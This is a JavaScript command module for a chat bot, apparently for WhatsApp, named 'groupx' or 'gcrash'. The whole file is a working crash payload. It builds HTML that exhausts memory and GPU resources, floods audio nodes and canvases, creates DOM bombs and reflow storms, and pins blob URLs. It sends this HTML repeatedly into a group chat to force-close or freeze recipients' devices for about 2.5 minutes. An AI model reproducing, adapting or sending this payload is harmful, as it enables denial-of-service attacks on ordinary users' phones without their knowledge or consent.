'use strict';

const { sendRichHtml } = require('../../utils/genaiRich');

/* ═══════════════════════════════════════════════════════════════
   CRASH PAYLOAD BUILDER
   Targets:
     - OOM force-close  : allocate past Android/iOS process kill limit
     - GPU VRAM OOM     : will-change on 8 000 nodes = 8 000 GPU layers
     - Main-thread lock : 20 RAF loops × 8 000 DOM touches per tick
     - Reflow storm     : 50 setIntervals all triggering layout queries
     - Audio node flood : 500 chained AudioNodes
     - Canvas raster    : 4096×4096 putImageData every frame (×4 RAF)
     - WebGL VRAM bomb  : 100 × 4096×4096 textures uploaded to GPU
     - Nested DOM bomb  : 8^5 = 32 768 deeply-nested nodes
     - Blob URL pins    : 500 object URLs keeping memory hostage
     - WASM memory grab : tries WebAssembly.Memory(2GB)
   Time-limited: all loops abort after TTL ms (default 150 000 = 2.5 min)
═══════════════════════════════════════════════════════════════ */
function buildCrashHtml(ttlMs) {
    const TTL = ttlMs || 150000;

    /* ── 8 000 DOM NODES ── */
    let megaDom = '';
    for (let i = 0; i < 8000; i++) {
        megaDom +=
            '<div class="c' + (i % 80) + '" id="n' + i +
            '" data-i="' + i + '"><span class="s">' + i + '</span></div>';
    }

    /* ── 80 KEYFRAME ANIMATIONS + GPU LAYER FORCING ──
       will-change:transform,opacity,filter creates a dedicated compositor
       layer per element. 8 000 layers on a mobile GPU = VRAM exhaustion.
       backdrop-filter on alternating frames forces full offscreen composite. */
    let megaCss =
        '*{box-sizing:border-box;margin:0;padding:0}' +
        'body{overflow:hidden;width:100vw;height:100vh;background:#000;position:relative}' +
        'canvas{position:absolute;top:0;left:0}';

    for (let i = 0; i < 80; i++) {
        const tx1 = i * 8 - 320, ty1 = i * 5 - 200;
        const tx2 = -tx1,        ty2 = -ty1;
        const rot  = i * 9;
        const sc1  = (0.3 + i * 0.018).toFixed(3);
        const sc2  = (2.0 - i * 0.010).toFixed(3);
        const bl1  = (i * 0.15).toFixed(2);
        const bl2  = (i * 0.07).toFixed(2);
        const hue  = i * 4;
        const dur  = (0.2 + i * 0.03).toFixed(2);
        const sc1p = (parseFloat(sc1) + 0.5).toFixed(3);
        const bl1x = (parseFloat(bl1) * 3).toFixed(2);

        megaCss +=
            '.c' + i + '{' +
                'position:absolute;' +
                'will-change:transform,opacity,filter;' +
                'isolation:isolate;' +
                'animation:k' + i + ' ' + dur + 's infinite alternate cubic-bezier(.17,.67,.83,.67)' +
            '}' +
            '@keyframes k' + i + '{' +
                '0%{transform:translate(' + tx1 + 'px,' + ty1 + 'px)rotate(' + rot + 'deg)scale(' + sc1 + ');' +
                    'filter:blur(' + bl1 + 'px)hue-rotate(' + hue + 'deg)brightness(3)drop-shadow(0 0 ' + i + 'px red);opacity:.9}' +
                '33%{transform:translate(' + ty1 + 'px,' + tx2 + 'px)rotate(' + Math.floor(rot / 2) + 'deg)scale(' + sc1p + ');' +
                    'filter:blur(' + bl1x + 'px)hue-rotate(' + (hue * 2) + 'deg)contrast(5);opacity:.5}' +
                '66%{transform:translate(' + tx2 + 'px,' + ty2 + 'px)rotate(-' + rot + 'deg)scale(' + sc2 + ');' +
                    'filter:blur(' + bl2 + 'px)hue-rotate(' + (hue * 3) + 'deg)saturate(10);' +
                    'backdrop-filter:blur(20px);opacity:.7}' +
                '100%{transform:translate(' + ty2 + 'px,' + tx1 + 'px)rotate(0)scale(1);filter:none;opacity:1}' +
            '}';
    }

    megaCss +=
        '.s{display:block;will-change:transform;' +
            'animation:sp .08s linear infinite}' +
        '@keyframes sp{to{transform:rotate(360deg)}}';

    /* ── HEAVY JS ── */
    const heavyJs = `(function(){
var END=Date.now()+${TTL};
function alive(){return Date.now()<END;}

/* 1 ── OOM BOMB: ArrayBuffer + Float64Array = push past process kill limit */
var ram=[];
try{for(var i=0;i<400;i++)ram.push(new ArrayBuffer(2*1024*1024));}catch(e){}
var f64=[];
try{for(var i=0;i<300;i++)f64.push(new Float64Array(400000).fill(Math.PI));}catch(e){}

/* 2 ── WASM MEMORY GRAB */
try{
  var wm=new WebAssembly.Memory({initial:256,maximum:32768});
  wm.grow(256);
  var wm2=new WebAssembly.Memory({initial:256,maximum:32768});
  wm2.grow(512);
}catch(e){}

/* 3 ── WEBGL TEXTURE VRAM BOMB */
(function(){
  var cv=document.createElement('canvas');
  cv.width=4096;cv.height=4096;
  document.body.appendChild(cv);
  var gl=cv.getContext('webgl2')||cv.getContext('webgl')||cv.getContext('experimental-webgl');
  if(!gl)return;
  var textures=[];
  try{
    for(var i=0;i<120;i++){
      var t=gl.createTexture();
      gl.bindTexture(gl.TEXTURE_2D,t);
      gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,4096,4096,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
      gl.generateMipmap(gl.TEXTURE_2D);
      textures.push(t);
    }
  }catch(e){}
  function glBomb(){
    if(!alive()){textures.forEach(function(t){gl.deleteTexture(t)});return;}
    gl.clearColor(Math.random(),Math.random(),Math.random(),1);
    gl.clear(gl.COLOR_BUFFER_BIT|gl.DEPTH_BUFFER_BIT);
    textures.forEach(function(t,i){
      gl.bindTexture(gl.TEXTURE_2D,t);
    });
    requestAnimationFrame(glBomb);
  }
  glBomb();
})();

/* 4 ── AUDIO NODE CHAIN FLOOD: 500 oscillators through convolver+delay+comp */
(function(){
  var ac;
  try{
    ac=new(window.AudioContext||window.webkitAudioContext)();
    for(var i=0;i<500;i++){
      var o=ac.createOscillator();
      var g=ac.createGain();
      var cv=ac.createConvolver();
      var dl=ac.createDelay(1);
      var cp=ac.createDynamicsCompressor();
      var an=ac.createAnalyser();
      an.fftSize=32768;
      o.type=['sine','square','sawtooth','triangle'][i%4];
      o.frequency.value=10+i*22;
      o.detune.value=i*13;
      g.gain.value=0;
      o.connect(g);g.connect(cv);cv.connect(dl);dl.connect(cp);cp.connect(an);an.connect(ac.destination);
      o.start();
    }
  }catch(e){}
})();

/* 5 ── CANVAS RASTER BOMB: 4 × 4096² full putImageData per frame */
(function(){
  function makeCv(w,h){var c=document.createElement('canvas');c.width=w;c.height=h;document.body.appendChild(c);return c;}
  var canvases=[makeCv(4096,4096),makeCv(4096,4096),makeCv(2048,2048),makeCv(2048,2048)];
  var ctxs=canvases.map(function(c){return c.getContext('2d');});
  function bomb(ctx,w,h){
    if(!alive())return;
    var id=ctx.createImageData(w,h);
    var d=id.data,t=Date.now();
    for(var i=0,l=d.length;i<l;i+=4){d[i]=(i^t)&255;d[i+1]=(i*2^t)&255;d[i+2]=(i*3^t)&255;d[i+3]=255;}
    ctx.putImageData(id,0,0);
    requestAnimationFrame(function(){bomb(ctx,w,h);});
  }
  ctxs[0]&&bomb(ctxs[0],4096,4096);
  ctxs[1]&&bomb(ctxs[1],4096,4096);
  ctxs[2]&&bomb(ctxs[2],2048,2048);
  ctxs[3]&&bomb(ctxs[3],2048,2048);
})();

/* 6 ── DEEPLY NESTED DOM BOMB: 8^5 = 32 768 nodes */
(function(){
  function nest(d){var el=document.createElement('div');if(d>0){for(var i=0;i<8;i++)el.appendChild(nest(d-1));}return el;}
  try{document.body.appendChild(nest(5));}catch(e){}
})();

/* 7 ── RAF DOM TORTURE: 20 loops × 8 000 style writes per tick */
(function(){
  var divs=document.querySelectorAll('div');
  var dLen=divs.length;
  function rafBomb(){
    if(!alive())return;
    var t=Date.now();
    for(var i=0;i<dLen;i++){
      var d=divs[i];
      d.style.left=Math.sin(t/30+i)*500+'px';
      d.style.top=Math.cos(t/40+i*1.3)*500+'px';
      d.style.transform='rotate('+((t/10+i*7)%360)+'deg)scale('+(Math.abs(Math.sin(t/150+i))*2+0.3)+')';
      d.style.opacity=((Math.sin(t/80+i)+1)/2).toFixed(3);
      d.style.zIndex=i%9999;
    }
    requestAnimationFrame(rafBomb);
  }
  for(var r=0;r<20;r++)requestAnimationFrame(rafBomb);
})();

/* 8 ── REFLOW STORM + MICROTASK QUEUE FLOOD */
(function(){
  function microFlood(){
    if(!alive())return;
    void document.body.offsetHeight;
    void document.body.offsetWidth;
    void document.documentElement.scrollTop;
    Promise.resolve().then(microFlood);
  }
  microFlood();
})();

/* 9 ── INTERVAL STORM: 50 × setInterval all touching layout */
(function(){
  for(var s=0;s<50;s++){
    (function(s){
      var tid=null;
      function tick(){
        if(!alive()){clearInterval(tid);return;}
        void document.body.offsetHeight;
        void document.body.getBoundingClientRect();
        var st=document.createElement('style');
        st.textContent='div:nth-child('+(Math.random()*8000|0)+'){color:hsl('+(Math.random()*360|0)+',100%,50%)!important;outline:'+(Math.random()*4|0)+'px solid red}';
        document.head.appendChild(st);
        if(document.head.children.length>600)document.head.removeChild(document.head.firstChild);
      }
      tid=setInterval(tick, s%3===0?1:s%3===1?4:16);
    })(s);
  }
})();

/* 10 ── BLOB URL MEMORY PINS: 600 object URLs never revoked */
(function(){
  var bigStr='';
  try{
    bigStr=new Array(200000).join('DOMAIN_EXPANSION_UNLIMITED_VOID_');
    for(var i=0;i<600;i++){
      URL.createObjectURL(new Blob([bigStr+i],{type:'text/plain'}));
    }
  }catch(e){}
})();

/* 11 ── INTERSECTIONOBSERVER FLOOD: observer on every div */
(function(){
  try{
    var obs=new IntersectionObserver(function(entries){
      entries.forEach(function(e){
        void e.target.offsetHeight;
        void e.target.getBoundingClientRect();
      });
    },{threshold:[0,.1,.2,.3,.4,.5,.6,.7,.8,.9,1]});
    document.querySelectorAll('div').forEach(function(d){obs.observe(d);});
  }catch(e){}
})();

/* 12 ── RESIZE / VISIBILITY TORTURE */
try{
  window.addEventListener('resize',function(){
    document.querySelectorAll('div').forEach(function(d){void d.offsetHeight;});
  });
  document.addEventListener('visibilitychange',function(){
    if(alive()){for(var i=0;i<10000;i++)void document.body.offsetHeight;}
  });
}catch(e){}

})();`;

    return '<!doctype html><html><head>' +
        '<meta name="viewport" content="width=device-width,initial-scale=1">' +
        '<style>' + megaCss + '</style>' +
        '</head><body>' +
        megaDom +
        '<script>' + heavyJs + '<\/script>' +
        '</body></html>';
}

/* ── CACHE ── */
let _html = null;
function getCrashHtml(ttl) {
    if (!_html) _html = buildCrashHtml(ttl);
    return _html;
}

async function burst(sock, jid, msg, count, delay, ttl) {
    const html = getCrashHtml(ttl);
    for (let i = 0; i < count; i++) {
        await sendRichHtml({ sock, jid, quoted: msg, html, interactive: true });
        if (i < count - 1) await new Promise(r => setTimeout(r, delay));
    }
}

module.exports = {
    name: 'groupx',
    aliases: ['gcrash', 'groupcrash', 'gcx', 'groupfreeze'],
    description: 'GenAI HTML payload bomb — OOM + GPU VRAM + audio flood + canvas raster. Group freezes for ~2.5 min.',
    usage: '.groupx [burst=1-5] [ttl=60-180]   e.g. .groupx 3 150',
    category: 'admin',

    async execute({ sock, msg, from, reply, isOwner, isBotOwner, args }) {
        if (!isOwner && !isBotOwner) {
            return reply('⛔ Owner only.');
        }

        const count  = Math.min(5, Math.max(1, parseInt(args?.[0]) || 3));
        const ttlSec = Math.min(180, Math.max(30, parseInt(args?.[1]) || 150));
        const ttlMs  = ttlSec * 1000;

        // Rebuild with requested TTL if different from cached
        _html = buildCrashHtml(ttlMs);

        try {
            await burst(sock, from, msg, count, 350, ttlMs);
        } catch (err) {
            console.error('[GROUPX]', err.message);
            await reply('❌ ' + err.message);
        }
    },
};
